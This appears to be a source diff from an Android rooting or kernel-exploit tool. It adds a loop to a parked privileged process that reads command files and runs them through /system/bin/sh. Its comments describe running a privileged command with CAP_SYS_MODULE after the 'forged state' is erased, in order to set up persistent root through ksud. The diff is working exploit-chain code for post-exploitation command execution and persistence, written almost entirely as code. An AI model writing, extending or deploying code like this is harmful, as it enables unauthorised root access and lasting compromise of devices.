@@ -14,6 +14,7 @@
 #include <signal.h>
 #include <stdlib.h>
 #include <sys/prctl.h>
+#include <sys/wait.h>
 #include <unistd.h>
 #include <string.h>
 
@@ -133,7 +134,51 @@ int main(int argc, char **argv) {
                 for (int s = 1; s < NSIG; s++) {
                     if (s != SIGKILL && s != SIGSTOP) (void) signal(s, SIG_IGN);
                 }
-                for (;;) pause();
+                /* Command channel: the cleaner cannot run a privileged command
+                 * itself (the rshell client keeps bounding set 0x8000c0), so the
+                 * receipt may carry a cmd= line; the cleaner drops it into
+                 * <home>/parked.d/<pid>.cmd once the forged state is erased, this
+                 * loop executes it here -- where CAP_SYS_MODULE still exists --
+                 * and the cleaner kills us only after <pid>.done appears.  That
+                 * is how /data/adb/ksud late-load (persistent root) is run after
+                 * the cleanup but before this process exits.  fork+exec is safe:
+                 * copy_process re-inits the child's pi_state_list and
+                 * __sched_fork clears pi_waiters/pi_top_task/pi_blocked_on. */
+                const char *h = getenv("GHOSTLOCK_HOME");
+                char cmdpath[600], donepath[600];
+                if (h && *h) {
+                    (void) snprintf(cmdpath, sizeof cmdpath, "%s/parked.d/%d.cmd", h, (int) getpid());
+                    (void) snprintf(donepath, sizeof donepath, "%s/parked.d/%d.done", h, (int) getpid());
+                } else {
+                    cmdpath[0] = donepath[0] = '\0';
+                }
+                for (;;) {
+                    if (cmdpath[0]) {
+                        const int cf = open(cmdpath, O_RDONLY | O_CLOEXEC);
+                        if (cf >= 0) {
+                            char buf[512] = {0};
+                            const ssize_t n = read(cf, buf, sizeof(buf) - 1);
+                            close(cf);
+                            (void) unlink(cmdpath);
+                            if (n > 0) {
+                                pr_info("park cmd: running '%s'\n", buf);
+                                const pid_t c = fork();
+                                if (c == 0) {
+                                    execl("/system/bin/sh", "sh", "-c", buf, (char *) nullptr);
+                                    _exit(127);
+                                }
+                                pr_info("park cmd: child pid=%d\n", (int) c);
+                                const int df = open(donepath, O_WRONLY | O_CREAT | O_TRUNC, 0666);
+                                if (df >= 0) {
+                                    (void) !write(df, "done\n", 5);
+                                    close(df);
+                                }
+                            }
+                        }
+                    }
+                    while (waitpid(-1, nullptr, WNOHANG) > 0) { }
+                    usleep(200000);
+                }
             }
             return 0;
         case stages::StageResult::Continue:
